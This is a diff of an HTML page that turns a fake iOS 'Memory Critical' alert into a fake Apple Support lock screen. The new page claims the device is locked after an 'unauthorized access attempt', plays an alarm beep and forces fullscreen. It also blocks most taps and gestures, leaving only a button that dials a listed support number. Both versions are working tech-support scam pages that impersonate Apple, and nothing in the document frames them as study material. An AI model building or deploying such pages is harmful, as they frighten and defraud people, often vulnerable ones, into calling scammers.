@@ -3,178 +3,274 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>iOS System Alert</title>
+    <title>Apple Support</title>
     <style>
         * {
+            margin: 0;
+            padding: 0;
             -webkit-touch-callout: none;
             -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
             user-select: none;
             touch-action: none;
-            pointer-events: none;
         }
         
         body {
-            margin: 0;
-            padding: 0;
             width: 100vw;
             height: 100vh;
             overflow: hidden;
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: black;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
             position: fixed;
         }
         
-        .alert-box {
+        .lock-screen {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80%;
-            max-width: 300px;
-            background: rgba(245,245,247,0.9);
-            border-radius: 14px;
-            overflow: hidden;
-            z-index: 9999;
-            backdrop-filter: blur(20px);
-            animation: glitch 0.5s infinite alternate;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: white;
+            z-index: 100;
         }
         
-        .alert-header {
-            padding: 15px;
+        .status-bar {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 20px;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .time-large {
+            font-size: 80px;
+            font-weight: 200;
+            margin-top: 100px;
+            margin-bottom: 5px;
+        }
+        
+        .date {
+            font-size: 20px;
+            font-weight: 400;
+            margin-bottom: 200px;
+        }
+        
+        .camera-button {
+            width: 60px;
+            height: 60px;
+            border-radius: 30px;
+            background-color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .emergency {
+            color: red;
+            margin-bottom: 10px;
+        }
+        
+        .slide-up {
+            position: absolute;
+            bottom: 50px;
+            width: 100%;
             text-align: center;
+            color: white;
+        }
+        
+        .slide-up-indicator {
+            width: 120px;
+            height: 5px;
+            background-color: white;
+            border-radius: 3px;
+            margin: 0 auto 10px;
+            opacity: 0.7;
+        }
+        
+        .support-page {
+            position: fixed;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            transition: transform 0.5s ease;
+            z-index: 101;
+        }
+        
+        .support-header {
+            background-color: #f5f5f7;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e1e1e1;
+        }
+        
+        .support-content {
+            padding: 20px;
+        }
+        
+        .support-title {
+            font-size: 24px;
             font-weight: 600;
-            font-size: 18px;
+            margin-bottom: 20px;
             color: #ff3b30;
         }
         
-        .alert-message {
-            padding: 15px;
-            font-size: 14px;
-            color: #1c1c1e;
-            text-align: center;
+        .support-text {
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.5;
         }
         
-        .alert-buttons {
-            display: flex;
-            border-top: 1px solid #d1d1d6;
-        }
-        
-        .alert-button {
-            flex: 1;
+        .call-button {
+            display: block;
+            width: 100%;
             padding: 15px;
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 500;
             text-align: center;
-            font-weight: 600;
-            font-size: 17px;
-            color: #007aff;
+            margin-top: 20px;
+            cursor: pointer;
             pointer-events: auto;
         }
         
-        .alert-button:active {
-            background: rgba(0,0,0,0.1);
+        .apple-logo {
+            width: 30px;
+            height: 30px;
+            margin-bottom: 10px;
         }
         
-        .screen-overlay {
+        .freeze-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 9998;
-        }
-        
-        .static-noise {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                rgba(0,0,0,0.15),
-                rgba(0,0,0,0.15) 1px,
-                transparent 1px,
-                transparent 2px
-            );
-            opacity: 0.3;
-            z-index: 9997;
-            animation: static 0.1s infinite;
-        }
-        
-        @keyframes glitch {
-            0% { transform: translate(-50%, -50%) translateX(0); }
-            20% { transform: translate(-50%, -50%) translateX(-2px); }
-            40% { transform: translate(-50%, -50%) translateX(2px); }
-            60% { transform: translate(-50%, -50%) translateY(-1px); }
-            80% { transform: translate(-50%, -50%) translateY(1px); }
-            100% { transform: translate(-50%, -50%); }
-        }
-        
-        @keyframes static {
-            0% { background-position: 0 0; }
-            100% { background-position: 0 10px; }
+            z-index: 9999;
+            pointer-events: none;
         }
     </style>
 </head>
-<body>
-    <div class="static-noise"></div>
-    <div class="screen-overlay"></div>
+<body onload="showSupportPage()">
+    <!-- Audio element for the beep sound -->
+    <audio id="alertBeep" preload="auto">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3" type="audio/mpeg">
+    </audio>
     
-    <div class="alert-box">
-        <div class="alert-header">Memory Critical</div>
-        <div class="alert-message">
-            System RAM overload detected. iOS has frozen processes to prevent damage.
-            Please restart your device.
+    <div class="lock-screen" id="lockScreen">
+        <div class="status-bar">
+            <div class="time" id="current-time">9:41</div>
+            <div class="icons">
+                <span>📶</span>
+                <span>🔋</span>
+            </div>
         </div>
-        <div class="alert-buttons">
-            <div class="alert-button" onclick="callSupport()">Call Support</div>
-            <div class="alert-button" style="border-left:1px solid #d1d1d6;">Restart</div>
+        
+        <div class="time-large" id="large-time">9:41</div>
+        <div class="date" id="current-date">Tuesday, April 2</div>
+        <div class="camera-button">📷</div>
+        <div class="emergency">Emergency</div>
+        
+        <div class="slide-up">
+            <div class="slide-up-indicator"></div>
+            <div>Slide up to open</div>
+        </div>
+    </div>
+    
+    <div class="support-page" id="supportPage">
+        <div class="support-header">
+            <svg class="apple-logo" viewBox="0 0 24 24" fill="#000">
+                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+            </svg>
+            <h2>Apple Support</h2>
+        </div>
+        
+        <div class="support-content">
+            <h3 class="support-title">Device Locked</h3>
+            <p class="support-text">Your device has been locked due to security reasons. Unauthorized access attempt detected.</p>
+            <p class="support-text">Please contact Apple Support immediately to unlock your device and secure your account.</p>
+            
+            <button class="call-button" onclick="callSupport()">Call Apple Support: +1-888-123-1234</button>
         </div>
     </div>
 
+    <div class="freeze-overlay"></div>
+
     <script>
-        // Block all interactions
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('touchmove', e => e.preventDefault(), {passive: false});
-        document.addEventListener('gesturestart', e => e.preventDefault());
-        
-        // Make only buttons clickable
-        document.querySelectorAll('.alert-button').forEach(btn => {
-            btn.style.pointerEvents = 'auto';
-        });
-        
-        // Simulate RAM freeze symptoms
-        let memoryWarnings = [
-            "Memory pressure critical",
-            "Failed to purge cached data",
-            "jetsam: unable to terminate process",
-            "VM compressor stalled",
-            "Low memory condition detected"
-        ];
-        
-        function showMemoryWarning() {
-            let randomMsg = memoryWarnings[Math.floor(Math.random() * memoryWarnings.length)];
-            console.error(`[kernel] ${randomMsg}`);
-            setTimeout(showMemoryWarning, Math.random() * 3000 + 1000);
+        // Update time and date
+        function updateTime() {
+            const now = new Date();
+            const timeOptions = { hour: 'numeric', minute: 'numeric' };
+            const dateOptions = { weekday: 'long', month: 'long', day: 'numeric' };
+            
+            document.getElementById('current-time').textContent = now.toLocaleTimeString([], timeOptions);
+            document.getElementById('large-time').textContent = now.toLocaleTimeString([], {hour: 'numeric', minute: 'numeric'}).replace(/^(\d+:\d{2}).*/, '$1');
+            document.getElementById('current-date').textContent = now.toLocaleDateString([], dateOptions);
         }
         
-        // Start showing fake memory warnings
-        setTimeout(showMemoryWarning, 1000);
+        setInterval(updateTime, 1000);
+        updateTime();
         
-        // Fake support call
+        // Show support page on load and play beep
+        function showSupportPage() {
+            document.getElementById('supportPage').style.transform = 'translateY(-100%)';
+            
+            // Play the alert beep sound
+            const beep = document.getElementById('alertBeep');
+            beep.volume = 0.5; // Set volume to 50%
+            beep.play().catch(e => console.log("Audio play failed:", e));
+            
+            // Block all interactions
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            document.addEventListener('gesturestart', function(e) {
+                e.preventDefault();
+            });
+            
+            document.addEventListener('touchmove', function(e) {
+                if (e.target.className !== 'call-button') {
+                    e.preventDefault();
+                }
+            }, { passive: false });
+        }
+        
+        // Call support function
         function callSupport() {
             window.location.href = 'tel:+18881231234';
         }
         
-        // Attempt fullscreen
+        // Prevent any other clicks
+        document.addEventListener('click', function(e) {
+            if (e.target.className !== 'call-button') {
+                e.preventDefault();
+                e.stopPropagation();
+            }
+        }, true);
+        
+        // Attempt full screen
         function requestFullScreen() {
             const el = document.documentElement;
-            const rfs = el.requestFullscreen || el.webkitRequestFullscreen;
-            if (rfs) rfs.call(el);
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+            else if (el.msRequestFullscreen) el.msRequestFullscreen();
         }
         
-        // Try to enter full screen
-        document.addEventListener('click', requestFullScreen, {once: true});
+        // Try to enter full screen after a short delay
+        setTimeout(requestFullScreen, 500);
     </script>
 </body>
 </html>
